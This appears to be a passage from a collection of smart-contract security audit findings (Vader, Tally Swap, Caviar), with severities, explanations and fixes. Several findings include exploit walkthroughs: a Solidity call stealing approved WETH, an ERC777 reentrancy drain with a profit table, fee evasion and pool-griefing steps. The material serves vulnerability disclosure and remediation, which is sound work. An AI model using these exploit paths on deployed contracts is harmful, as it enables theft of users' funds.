<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L113-L148>

    function syncVaderPrice()
        public
        override
        returns (
            uint256[] memory pastLiquidityWeights,
            uint256 pastTotalLiquidityWeight
        )
    {
        uint256 _totalLiquidityWeight;
        uint256 totalPairs = vaderPairs.length;
        pastLiquidityWeights = new uint256[](totalPairs);
        pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];

        for (uint256 i; i < totalPairs; ++i) {
            IUniswapV2Pair pair = vaderPairs[i];
            ExchangePair storage pairData = twapData[address(pair)];
            uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;

            if (timeElapsed < pairData.updatePeriod) continue;

            uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;
            uint256 currentLiquidityEvaluation = _updateVaderPrice(
                pair,
                pairData,
                timeElapsed
            );

            pastLiquidityWeights[i] = pastLiquidityEvaluation;

            pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;

            _totalLiquidityWeight += currentLiquidityEvaluation;
        }

        totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight;
    }

As shown above, `pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)]` loads in the total liquidity weight which is updated when `_addVaderPair` is called. However, `pastLiquidityWeights` is calculated by iterating through each token pair that is eligible to be updated.

#### Recommended Mitigation Steps

Consider removing the line `totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;` in `_addVaderPair` so that newly added tokens do not impact upcoming queries for `VADER/USDV` price data. This should ensure `syncVaderPrice` and `syncUSDVPrice` cannot be manipulated when adding new tokens.





***"
70.md,Using single total native reserve variable for synth and non-synth reserves of `VaderPoolV2` can lead to losses for synth holders,high,"Users that mint synths do provide native assets, increasing native reserve pool, but do not get any liquidity shares issued.
In the same time, an exit of non-synth liquidity provider yields releasing a proportion of all current reserves to him.

Whenever an exit of non-synth LP is substantial enough, the system will have much less native asset regarding the cumulative deposit of synth holders. That is, when a LP entered he provided a share of current reserves, both native and foreign, and got the corresponding liquidity shares in return. Suppose then big enough amounts of synths were minted, providing correspondingly big enough amount of native assets. If the LP now wants to exit, he will obtain a part of total native assets, including a part of the amount that was provided by synth minter. If the exit is big enough there will be substantially less native assets left to reimburse the synth minter than he initially provided. This is not reversible: the synth minters lost their native assets to LP that exited.

#### Proof of Concept

There are three types of mint/burn: NFT, fungible and synths. First two get LP shares, the latter gets synths. Whenever NFT or fungible LP exits, it gets a proportion of combined reserves. That is, some of native reserves were deposited by synth minters, but it is not accounted anyhow, only one total reserve number per asset is used.

Suppose the following scenario, Alice wants to provide liquidity, while Bob wants to mint synths:

1.  Alice deposits both sides to a pool, 100 USDV and 100 foreign.
2.  Bob deposit 100 USDV and mints some foreign Synth.
3.  LP withdraws 95% of her liquidity shares. As she owns the pool liquidity, she gets 95% of USDV and foreign total reserves, 190 USDV and 95 foreign. Alice received almost all of her and Bob's USDV.
4.  If Bob burn his synth and withdraw, he will get a tiny fraction of USDV he deposited (calculated by VaderMath.calculateSwap, we use its terms):

<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex/math/VaderMath.sol#L98>
x = 100, X = 0.05 \* 200 = 10, Y = 0.05 \* 100 = 5.
Swap outcome, how much USDV will Bob get, is x \* Y \* X / (x + X) ^ 2 = 100 \* 5 \* 10 / (110^2) = 0.4 (rounded).

The issue is that synth provided and LP provided USDV aren't accounted separately, total reserves number if used everywhere instead:

Synth minters provide native asset, say USDV, to the system:
<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187>

Synth minters get synths and no LP shares, while to account for their deposit, the total USDV balance is increased:
<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187>

When LP enters, it gets liquidity shares proportionally to current reserves (NFT mint, notice the reserveNative, which is BasePoolV2's pair.reserveNative, total amount of native asset in the Pool):
<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L497>

When LP exits, it gets a proportion of current reserves back (NFT burn):
<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L223>

The same happens when fungible LP mints (same reserveNative):
<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L336>
And burns:
<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L401>

#### Recommended Mitigation Steps

Account for LP provided liquidity separately from total amount variables, i.e. use only LP provided native reserves variables in LP shares mint and burn calculations.
That should suffice as total amount of native assets is still to be used elsewhere, whenever the whole pool is concerned, for example, in rescue function, swap calculations and so forth.





***"
70.md,Council veto protection does not work,high,"Council can veto proposals to remove them to remain in power.

#### Proof of Concept

The Vader governance contract has the concept of a ""council"" which can unilaterally accept or reject a proposal. To prevent a malicious council preventing itself from being replaced by the token holders, the veto function checks the calldata for any proposal action directed at `GovernorAlpha` to see if it matches the `changeCouncil` function selector.

Note this is done by reading from the `proposal.calldatas` array.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L568-L603>

If we look at the structure of a proposal however we can see that the function selector is held (in the form of the signature) in the `signatures` array rather than being included in the calldata. The `calldata` array then holds just the function arguments for the call rather than specifying which function to call.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L71-L72>

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L356-L362>

Indeed if we look at the `TimeLock` contract we see that the signature is hashed to calculate the function selector and is prepended onto the calldata.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/Timelock.sol#L292-L299>

Looking at the function signature of the `changeCouncil` we can see that the value that the `veto` function will check against `this.changeCouncil.signature` will be the first 4 bytes of an abi encoded address and so will always be zero no matter what function is being called.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L623>

High risk as this issue gives the council absolute control over the DAO such that they cannot be removed.

#### Recommended Mitigation Steps

Hash the function signatures to calculate function selectors and then check those rather than the calldata.

This is something that should be picked up by a test suite however, I'd recommend writing tests to ensure that protections you add to the code have any affect and more broadly check that the code behaves as expected.





***"
70.md,Denial of service,high,"<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L334>
on the first deposit, the total liquidity is set to `nativeDeposit`.
this might be a very low number compared to `foreignDeposit`.
It can cause a denial of service of the pair.

#### Impact

A pair can enter a denial of service state.

#### Proof of Concept

consider the following scenario:
the owner of the pool calls `setFungibleTokenSupport` for a new token, for example weth.
a malicious actor calls `mintFungible`,  with `nativeDeposit == 1` and `foreignDeposit == 10 ether`.
`totalLiquidityUnits` will be 1.
the pool can be arbitraged, even by the attacker, but `totalLiquidityUnits` will still be 1.
this means that 1 liquidity token is equal to all of the pool reserves, which is a lot of money.
It will cause a very high rounding error for anyone trying to mint liquidity.
then, anyone who will try to mint liquidity will either:

1.  fail, because they can't mint 0 liquidity if their amount is too small.
2.  get less liquidity tokens than they should, because there is a very high rounding error, and its against new liquidity providers.

The rounding error losses will increase the pool reserves, which will increase value of liquidity tokens, so the hacker can even profit from this.

after this is realised, no one will want to provide liquidity, and since the pair cannot be removed or replaced, it will cause denial of service for that token forever.





***"
70.md,`VaderPoolV2.mintFungible` exposes users to unlimited slippage,medium,"Frontrunners can extract up to 100% of the value provided by LPs to VaderPoolV2 as fungible liquidity.

#### Proof of Concept

Users can provide liquidity to `VaderPoolV2` through the `mintFungible` function.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L311-L317>

This allows users to provide tokens in any ratio and the pool will calculate what fraction of the value in the pool this makes up and mint the corresponding amount of liquidity units as an ERC20.

However there's no way for users to specify the minimum number of liquidity units they will accept. As the number of liquidity units minted is calculated from the current reserves, this allows frontrunners to manipulate the pool's reserves in such a way that the LP receives fewer liquidity units than they should. e.g. LP provides a lot of `nativeAsset` but very little `foreignAsset`, the frontrunner can then sell a lot of `nativeAsset` to the pool to devalue it.

Once this is done the attacker returns the pool's reserves back to normal and pockets a fraction of the value which the LP meant to provide as liquidity.

#### Recommended Mitigation Steps

Add a user-specified minimum amount of LP tokens to mint.






***"
70.md,Adding pair of the same `foreignAsset` would replace oracle of earlier entry,medium,"Oracles are mapped to the `foreignAsset` but not to the specific pair. Pairs with the same `foreignAsset` (e.g. UniswapV2 and Sushi) will be forced to use the same oracle. Generally this should be the expected behavior but there are also possibility that while adding a new pair changed the oracle of an older pair unexpectedly.

#### Proof of Concept

<https://github.com/code-423n4/2021-12-vader/blob/9fb7f206eaff1863aeeb8f997e0f21ea74e78b49/contracts/lbt/LiquidityBasedTWAP.sol#L271>

            oracles[foreignAsset] = oracle;

#### Recommended Mitigation Steps

Bind the oracle to pair instead





***"
70.md,No way to remove `GasThrottle` from `VaderPool` after deployment,medium,"Potential DOS on swaps on `VaderPool`.

#### Proof of Concept

BasePool makes use of a `validateGas` modifier on swaps which checks that the user's gas price is below the value returned by `_FAST_GAS_ORACLE`.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/pool/BasePool.sol#L292>

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/utils/GasThrottle.sol#L8-L22>

Should  `_FAST_GAS_ORACLE` be compromised to always return zero then all swaps will fail. There is no way to recover from this scenario.

#### Recommended Mitigation Steps

Either remove GasThrottle.sol entirely or allow governance to turn it off as is done in VaderPoolV2.sol



***"
70.md,`VaderReserve.reimburseImpermanentLoss` improperly converts USDV to VADER,medium,"IL isn't properly converted from being in terms of USDV to VADER, resulting in reserve paying out incorrect amount.

#### Proof of Concept

`VaderReserve.reimburseImpermanentLoss` receives an `amount` in terms of USDV and converts this to an amount of VADER to send to `recipient`.

However as shown in the link if there is a previous price stored for USDV, the amount of VADER tokens to be sent to the `recipient` is `amount / usdvPrice`.

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/reserve/VaderReserve.sol#L84-L110>

`usdvPrice` is the total USD value of foreign assets divided by the total amount of USDV in a number of pairs. It's then some measure of the inverse of the price of USDV in USD, nothing to do with converting into VADER.

The reserve will then improperly calculate the amount of VADER to pay out once there is a single reading of the USDV price.

#### Recommended Mitigation Steps

It looks like both branches of this if statement are supposed to be run, i.e. convert from USDV to USD and then to VADER but I can't be sure. Care should be taken so that the calculation being performed is the expected one.





***"
70.md,"Users can lock themselves out of being able to convert VETH, becoming stuck with the deprecated asset",medium,"I've put this as a medium issue as we're leaking value as users are stuck with assets which are likely to be worth much less as they are deprecated. It could also be low as it's not exploitable by outside parties and the loss isn't taken by the protocol but the user.

#### Impact

Potential for users to lose the right to convert VETH to VADER, being stuck with a deprecated token.

#### Proof of Concept

Should a user have a zero allowance of VETH on the converter, no VETH will be taken and no VADER will be paid out as L147 will set the amount to zero.

<https://github.com/code-423n4/2021-12-vader/blob/28d3405447f0c3353964ca755a42562840d151c5/contracts/tokens/converter/Converter.sol#L145-L150>

There is a `minVader` check on L153 to enforce a minimum output of VADER but should this be improperly set the transaction would succeed with the user receiving much less VADER than they expect.

Crucially, the merkle proof that was used in this transaction will be marked as invalid so the user will not be able to try again once they have set the proper allowance. Someone can then lose the opportunity to convert their VETH and are left with a worthless deprecated token if they are inattentive.

It seems like this is trying to handle the case where a user doesn't have the full amount of VETH as they are entitled to convert (by setting their allowance equal to their balance?). This is a pretty suboptimal way to go about this as it's extremely implicit so users are liable to make mistakes.

I'd recommend decoupling the merkle proof from conversion of VETH to VADER:

1.  Change the merkle proof to set an `amountEligibleToConvert` value in storage for each user (which would be initially set to `amount`).
2.  Allow a user to then convert VETH to VADER up to their `amountEligibleToConvert` value, subtracting the amount converted from this each time.

For gas efficiency we can use a sentinel value here to mark a user which has claimed their full quota already distinctly from someone who hasn't provided a merkle proof yet (to avoid having to track this separately in another storage slot)

These two steps could be chained in a single transaction to give a similar UX as currently but would also allow users to recover in the case of partial conversions.

#### Recommended Mitigation Steps

As above. I'd caution against just stating ""The frontend will handle this correctly so this isn't an issue"", there will be users who interact with the contract manually so it's important to make the interface safe where possible.





***"
70.md,Oracle can be manipulted to consider only a single pair for pricing,medium,"Loss of resilience of oracle to a faulty pricing for a single pair.

#### Proof of Concept

In the oracle we calculate the TVL of each pool by pulling the reserves and multiplying both assets by the result of a supposedly manipulation resistant oracle (the oracle queries its previous value for USDV and pulls the foreign asset from chainlink).

<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/lbt/LiquidityBasedTWAP.sol#L353-L383>

This value can be manipulated by skewing the reserves of the underlying pair with a flashloan attack. An attacker can then make a pool appear with an arbitrarily large `currentLiquidityEvaluation` which will result in all other pairs contributing negligibly to the final result of the oracle.

This doesn't result in loss of funds by itself afaict but should there be an issue for the chainlink price feed for the asset in any pool then an attacker can force the oracle to only use that pool for pricing USDV/VADER

Medium risk as ""Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements."" External requirements being a malfunctioning or deprecated chainlink pricefeed for any used asset.

Calculating TVL of the pool is equivalent to value of all LP tokens so for more information see this post: <https://blog.alphafinance.io/fair-lp-token-pricing/>

#### Recommended Mitigation Steps

Calculate fair reserves using the pool invariant and the fair prices of the two assets.

The above link contains a mitigates for Uniswap, a similar calculation would have to be performed which is specific for the Vader invariant.




***"
44.md,Arbitrary contract call allows attackers to steal ERC20 from users' wallets,high,"[`Swap.sol L200-L212`](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L212)

```solidity
function fillZrxQuote(
    IERC20 zrxBuyTokenAddress,
    address payable zrxTo,
    bytes calldata zrxData,
    uint256 ethAmount
) internal returns (uint256, uint256) {
    uint256 originalERC20Balance = 0;
    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {
        originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));
    }
    uint256 originalETHBalance = address(this).balance;

    (bool success,) = zrxTo.call{value: ethAmount}(zrxData);
```

A call to an arbitrary contract with custom calldata is made in `fillZrxQuote()`, which means the contract can be an ERC20 token, and the calldata can be `transferFrom` a previously approved user.

##### Impact
The wallet balances (for the amount up to the allowance limit) of the tokens that users approved to the contract can be stolen.

##### PoC
Given:

*   Alice has approved 1000 WETH to `Swap.sol`;

The attacker can:
```solidity
TallySwap.swapByQuote(
    address(WETH),
    0,
    address(WETH),
    0,
    address(0),
    address(WETH),
    abi.encodeWithSignature(
        ""transferFrom(address,address,uint256)"",
        address(Alice),
        address(this),
        1000 ether
    )
)
```

As a result, 1000 WETH will be stolen from Alice and sent to the attacker.

This PoC has been tested on a forking network.

##### Recommendation
Consider adding a whitelist for `zrxTo` addresses."
44.md,Wrong calculation of `erc20Delta` and `ethDelta`,high,"[`Swap.sol` L200-L225](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L225)

```solidity
function fillZrxQuote(
    IERC20 zrxBuyTokenAddress,
    address payable zrxTo,
    bytes calldata zrxData,
    uint256 ethAmount
) internal returns (uint256, uint256) {
    uint256 originalERC20Balance = 0;
    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {
        originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));
    }
    uint256 originalETHBalance = address(this).balance;

    (bool success,) = zrxTo.call{value: ethAmount}(zrxData);
    require(success, ""Swap::fillZrxQuote: Failed to fill quote"");

    uint256 ethDelta = address(this).balance.subOrZero(originalETHBalance);
    uint256 erc20Delta;
    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {
        erc20Delta = zrxBuyTokenAddress.balanceOf(address(this)).subOrZero(originalERC20Balance);
        require(erc20Delta > 0, ""Swap::fillZrxQuote: Didn't receive bought token"");
    } else {
        require(ethDelta > 0, ""Swap::fillZrxQuote: Didn't receive bought ETH"");
    }

    return (erc20Delta, ethDelta);
}
```

When a user tries to swap unwrapped ETH to ERC20, even if there is a certain amount of ETH refunded, at L215, `ethDelta` will always be `0`.

That's because `originalETHBalance` already includes the `msg.value` sent by the caller.

Let's say the ETH balance of the contract is `1 ETH` before the swap.

*   A user swaps `10 ETH` to USDC;
*   `originalETHBalance` will be `11 ETH`;
*   If there is `1 ETH` of refund;
*   `ethDelta` will be `0` as the new balance is `2 ETH` and `subOrZero(2, 11)` is `0`.

Similarly, `erc20Delta` is also computed wrong.

Consider a special case of a user trying to arbitrage from `WBTC` to `WBTC`, the `originalERC20Balance` already includes the input amount, `erc20Delta` will always be much lower than the actual delta amount.

For example, for an arb swap from `1 WBTC` to `1.1 WBTC`, the `ethDelta` will be `0.1 WBTC` while it should be `1.1 WBTC`.

##### Impact
*   User can not get ETH refund for swaps from ETH to ERC20 tokens;
*   Arb swap with the same input and output token will suffer the loss of almost all of their input amount unexpectedly.

##### Recommendation
Consider subtracting the input amount from the originalBalance."
44.md,Swap.sol implements potentially dangerous transfer,medium,"#### Impact
The use of `transfer()`  in ` Swap.sol`   may have unintended outcomes on the eth being sent to the receiver. Eth may be irretrievable or undelivered if the `msg.sender`   or `feeRecipient`   is a smart contract. Funds can potentially be lost if;

1.  The smart contract fails to implement the payable fallback function
2.  The fallback function uses more than 2300 gas units

The latter situation may occur in the instance of gas cost changes. The impact would mean that any contracts receiving funds would potentially be unable to retrieve funds from the swap.

#### Proof of Concept
This issue directly impacts the following lines of code:
- [L257](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L257)
- [L173](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L173)
- [L158](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L158)

Examples of similar issues ranked as medium can be found [here](https://github.com/code-423n4/2021-08-notional-findings/issues/15) and [here, just search for 'M04'](https://blog.openzeppelin.com/opyn-gamma-protocol-audit/). A detailed explanation of why relying on `payable().transfer()` may result in unexpected loss of eth can be found [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/)

#### Tools Used
Manual review

#### Recommended Mitigation Steps
Re-entrancy has been accounted for in all functions that reference ` Solidity's   `  transfer() `  . This has been done by using a re-entrancy guard, therefore, we can rely on `  msg.sender.call.value(amount)\`  or using the OpenZeppelin [Address.sendValue library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/utils/Address.sol#L63)"
44.md,Unused ERC20 tokens are not refunded,medium,"Based on the context and comments in the code, we assume that it's possible that there will be some leftover sell tokens, not only when users are selling unwrapped ETH but also for ERC20 tokens.

However, in the current implementation, only refunded ETH is returned (L158).

Because of this, the leftover tkoens may be left in the contract unintentionally.

[`Swap.sol` L153-L181](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L153-L181)

```solidity
if (boughtERC20Amount > 0) {
    // take the swap fee from the ERC20 proceeds and return the rest
    uint256 toTransfer = SWAP_FEE_DIVISOR.sub(swapFee).mul(boughtERC20Amount).div(SWAP_FEE_DIVISOR);
    IERC20(zrxBuyTokenAddress).safeTransfer(msg.sender, toTransfer);
    // return any refunded ETH
    payable(msg.sender).transfer(boughtETHAmount);

    emit SwappedTokens(
        zrxSellTokenAddress,
        zrxBuyTokenAddress,
        amountToSell,
        boughtERC20Amount,
        boughtERC20Amount.sub(toTransfer)
    );
} else {

    // take the swap fee from the ETH proceeds and return the rest. Note
    // that if any 0x protocol fee is refunded in ETH, it also suffers
    // the swap fee tax
    uint256 toTransfer = SWAP_FEE_DIVISOR.sub(swapFee).mul(boughtETHAmount).div(SWAP_FEE_DIVISOR);
    payable(msg.sender).transfer(toTransfer);
    emit SwappedTokens(
        zrxSellTokenAddress,
        zrxBuyTokenAddress,
        amountToSell,
        boughtETHAmount,
        boughtETHAmount.sub(toTransfer)
    );
}
```"
44.md,Users can avoid paying fees for ETH swaps,medium,"Users can call `Swap.swapByQuote()` to execute an ETH swap (where they receive ETH) without paying swap fee for the gained ETH. They can trick the system by setting `zrxBuyTokenAddress` to an address of a malicious contract and making it think they have executed an ERC20 swap when they have actually executed an ETH swap. In this case, the system will give them the ETH they got from the swap (`boughtETHAmount`) without charging any swap fees for it, because the systems consideres this ETH as ""refunded ETH"" that wasn't part of the ""ERC20"" swap.

#### Impact
Users can execute ETH swap without paying swap fees for the ETH the got from the swap.

#### Proof of Concept
The steps of the attack are:

1.  Deploy a malicious contract (denoted by `M`), that will be used for `zrxBuyTokenAddress`.
2.  Call `Swap.swapByQuote()` with `zrxBuyTokenAddress=M` and `minimumAmountReceived=0`. The rest of the arguments should specify our ETH swap, nothing special here.
3.  Define `M` to return `0` and `1` at the first and second times when `fillZrxQuote` calls `zrxBuyTokenAddress.balanceOf(address(this))`, respectively.
4.  As a result, `boughtERC20Amount` now equals `1` and the function will ""return any refunded ETH"" to the caller, without charging any swap fees on it. This ETH is actually the output of that ETH swap.

#### Tool Used
Manual code review.

#### Recommended Mitigation Steps
Charge swap fees for the ""refunded ETH"" on ERC20 swaps (when `boughtERC20Amount > 0`), or require `boughtETHAmount == 0`."
193.md,Reentrancy in buy function for ERC777 tokens allows buying funds with considerable discount,high,"*Submitted by [carlitox477](https://github.com/code-423n4/2022-12-caviar-findings/issues/343), also found by [minhquanym](https://github.com/code-423n4/2022-12-caviar-findings/issues/445), [gzeon](https://github.com/code-423n4/2022-12-caviar-findings/issues/422), [9svR6w](https://github.com/code-423n4/2022-12-caviar-findings/issues/268), [Lambda](https://github.com/code-423n4/2022-12-caviar-findings/issues/258), [koxuan](https://github.com/code-423n4/2022-12-caviar-findings/issues/221), [KingNFT](https://github.com/code-423n4/2022-12-caviar-findings/issues/211), [cozzetti](https://github.com/code-423n4/2022-12-caviar-findings/issues/125), [rvierdiiev](https://github.com/code-423n4/2022-12-caviar-findings/issues/111), and [cccz](https://github.com/code-423n4/2022-12-caviar-findings/issues/78)*

<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L95><br>
<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L137><br>
<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L172><br>
<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L203>

Current implementation of functions `add`, `remove`, `buy` and `sell` first transfer fractional tokens, and then base tokens.

If this base token is ERC777 (extension of ERC20), we can call this function without updating the base token balance, but updating the fractional token balance.

### Impact

Allows to drain funds of a pairs which implements an ERC-777 token.

### Proof of Concept

```diff
function buy(uint256 outputAmount, uint256 maxInputAmount) public payable returns (uint256 inputAmount) {
    // *** Checks *** //

    // check that correct eth input was sent - if the baseToken equals address(0) then native ETH is used
    require(baseToken == address(0) ? msg.value == maxInputAmount : msg.value == 0, ""Invalid ether input"");

    // calculate required input amount using xyk invariant
+   @audit Use current balances
    inputAmount = buyQuote(outputAmount);

    // check that the required amount of base tokens is less than the max amount
    require(inputAmount <= maxInputAmount, ""Slippage: amount in"");

    // *** Effects *** //
+   @audit Modifies just fractional balance
    // transfer fractional tokens to sender
    _transferFrom(address(this), msg.sender, outputAmount);

    // *** Interactions *** //

    if (baseToken == address(0)) {
        // refund surplus eth
        uint256 refundAmount = maxInputAmount - inputAmount;
        if (refundAmount > 0) msg.sender.safeTransferETH(refundAmount);
    } else {

        // transfer base tokens in
+       @audit If an ERC-777 token is used, we can re call buy function with the same balance of base token, but with different fractional balance
        ERC20(baseToken).safeTransferFrom(msg.sender, address(this), inputAmount);

    }
    emit Buy(inputAmount, outputAmount);
}
```

```solidity
function buyQuote(uint256 outputAmount) public view returns (uint256) {
    return (outputAmount * 1000 * baseTokenReserves()) / ((fractionalTokenReserves() - outputAmount) * 997);
}
```

The buy quote is used to calculate the amount of fractional token that the user will receive, and it should be less/equal to **maxInputAmount** sent by parameter in order to achieve a successful execution of function buy.

Current buy quote can be mathematically expressed as: $\frac{outputAmount \times 1000 \times baseTokenReserves}{fractionalTokenReserves - outPutAmount} \times 997$.

Then, about sales

```diff
function sell(uint256 inputAmount, uint256 minOutputAmount) public returns (uint256 outputAmount) {
    // *** Checks *** //

    // calculate output amount using xyk invariant
    outputAmount = sellQuote(inputAmount);

    // check that the outputted amount of fractional tokens is greater than the min amount
    require(outputAmount >= minOutputAmount, ""Slippage: amount out"");

    // *** Effects *** //

    // transfer fractional tokens from sender
+   //@audit fractional balance is updated
    _transferFrom(msg.sender, address(this), inputAmount);

    // *** Interactions *** //

    if (baseToken == address(0)) {
        // transfer ether out
        msg.sender.safeTransferETH(outputAmount);
    } else {
        // transfer base tokens out
+       @audit If an ERC-777 token is used, we can re call sell function with the same balance of base token, but with different fractional balance.
        ERC20(baseToken).safeTransfer(msg.sender, outputAmount);
    }

    emit Sell(inputAmount, outputAmount);
}
```

```function sellQuote(uint256 inputAmount) public view returns (uint256) {
    uint256 inputAmountWithFee = inputAmount * 997;
    return (inputAmountWithFee * baseTokenReserves()) / ((fractionalTokenReserves() * 1000) + inputAmountWithFee);
}
```

Current sellQuote function can be expressed mathematically as:

$inputAmount = \frac{inputAmount \times 997 \times baseTokenReserves}{fractionalTokenReserves \times 1000 + inputAmountWithFee}$

Then we can think next scenario to drain a pair which use an ERC-777 token as base token:

1.  Let's suppose the pair has 1000 base tokens(BT777) and 1000 Fractional reserve tokens (FRT)
2.  The attacker call buy function, all with next inputs:
    *   outputAmount = 50
    *   maxInputAmount = 80
3.  The attacker implements a hook, that will be executed 6 times (using a counter inside a malicus contract) when a transfer is done, and call the buy function. After this 6 times the malicious contract is call again, but this times calls the sell function, doing a huge sell for the fractional reserve token obtained.

A simulation of this attack can be visualized in next table

| Operation      | outputAmount (FRT) | maxInputAmount (BT777) | BT777 reserve | FRT reserve | inputAmount (BT777 to pay) | inputAmount < maxInputAmount |
| :------------- | ------------------ | ---------------------- | ------------- | ----------- | -------------------------- | ---------------------------: |
| Attaker buy 1  | 50                 | 80                     | 1000          | 1000        | 52                         |                         TRUE |
| Callback buy 2 | 50                 | 80                     | 1000          | 950         | 55                         |                         TRUE |
| Callback buy 3 | 50                 | 80                     | 1000          | 900         | 59                         |                         TRUE |
| Callback buy 4 | 50                 | 80                     | 1000          | 850         | 62                         |                         TRUE |
| Callback buy 5 | 50                 | 80                     | 1000          | 800         | 66                         |                         TRUE |
| Callback buy 6 | 50                 | 80                     | 1000          | 750         | 71                         |                         TRUE |
| Callback buy 7 | 50                 | 80                     | 1000          | 700         | 77                         |                         TRUE |

The result of this operation is that the attaker/malicious contract has 350 FRT, while BT777 reserve still has 1000 and FRT reserve has 650 tokens. The success execution needs that the attacker pays 442 BT777 eventually.

To do this, the last operation of the malicious contract is calling sell function

| Operation    | inputAmount(BT777) | minOutputAmount | BT777 reserve | FRT reserve | outputAmount (BT777 to receive) | outputAmount > minOutputAmount |
| :----------- | ------------------ | --------------- | ------------- | ----------- | ------------------------------- | -----------------------------: |
| calback Sell | 350                | 442             | 1000          | 650         | 536                             |                           TRUE |

The result is that the attacker now controls 536 BT777, the attacker use this balance to pay the debt of 442 BT77, with a profit of 94 BT77 tokens.

### Recommended Mitigation steps

Add openzeppelin nonReentrant modifier to mentioned functions, or state clear in the documentation that this protocol should not be used with ERC777 tokens.




***"
193.md,Liquidity providers may lose funds when adding liquidity,high,"*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-caviar-findings/issues/376), also found by [minhtrng](https://github.com/code-423n4/2022-12-caviar-findings/issues/507), [minhquanym](https://github.com/code-423n4/2022-12-caviar-findings/issues/444), [HE1M](https://github.com/code-423n4/2022-12-caviar-findings/issues/398), [wait](https://github.com/code-423n4/2022-12-caviar-findings/issues/388), [hansfriese](https://github.com/code-423n4/2022-12-caviar-findings/issues/350), [BAHOZ](https://github.com/code-423n4/2022-12-caviar-findings/issues/342), [unforgiven](https://github.com/code-423n4/2022-12-caviar-findings/issues/340), [0xxm](https://github.com/code-423n4/2022-12-caviar-findings/issues/332), [Junnon](https://github.com/code-423n4/2022-12-caviar-findings/issues/329), [bytehat](https://github.com/code-423n4/2022-12-caviar-findings/issues/326), [UNCHAIN](https://github.com/code-423n4/2022-12-caviar-findings/issues/316), [carlitox477](https://github.com/code-423n4/2022-12-caviar-findings/issues/288), [RaymondFam](https://github.com/code-423n4/2022-12-caviar-findings/issues/287), [Chom](https://github.com/code-423n4/2022-12-caviar-findings/issues/285), [CRYP70](https://github.com/code-423n4/2022-12-caviar-findings/issues/278), [9svR6w](https://github.com/code-423n4/2022-12-caviar-findings/issues/275), [mauricio1802](https://github.com/code-423n4/2022-12-caviar-findings/issues/252), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-caviar-findings/issues/234), [hihen](https://github.com/code-423n4/2022-12-caviar-findings/issues/222), [caventa](https://github.com/code-423n4/2022-12-caviar-findings/issues/195), 